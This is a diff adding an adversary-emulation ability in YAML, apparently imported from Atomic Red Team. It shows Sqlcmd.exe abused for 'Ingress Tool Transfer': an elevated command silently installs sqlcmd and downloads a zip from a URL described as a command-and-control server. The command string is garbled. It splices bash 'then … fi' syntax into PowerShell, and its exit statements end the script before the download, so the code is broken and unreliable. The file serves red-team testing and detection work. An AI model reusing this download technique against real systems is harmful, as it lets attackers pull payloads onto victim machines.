@@ -1,0 +1,49 @@
+- id: 6934c16e-0b3a-4e7f-ab8c-c414acd32181
+  name: File Download with Sqlcmd.exe
+  description: 'One of the windows packages ''Sqlcmd.exe'' can be abused to download
+    malicious files from C2 servers
+
+    This Atomic will exhibit the similar behavior by downloading a sample zip file
+    from src directory of this Technique folder via GitHub URL'
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: 'if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}; then : ;
+          else winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null; fi; sqlcmd
+          -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip
+          -o C:\T1105.zip'
+        cleanup: rm "#{local_file_path}" 2>$null | Out-Null
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1105
+  - atomic-red-team
+  - command-and-control
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      remote_url:
+        description: URL of the C2 Server from where file/s need to be downloaded
+        type: url
+        default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip
+      local_file_path:
+        description: The local file path along with filename to where the file needs
+          to be downloaded and placed.
+        type: path
+        default: C:\T1105.zip
+    dependencies:
+    - description: Windows package 'Sqlcmd' need to be available in the machine to
+        execute this atomic successfully
+      prereq_command: if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}
+      get_prereq_command: winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null
+    technique_created: '2017-05-31T21:31:16.408Z'
+    atomic_guid: 6934c16e-0b3a-4e7f-ab8c-c414acd32181
+    import_timestamp: '2025-06-24T11:15:05.748592Z'
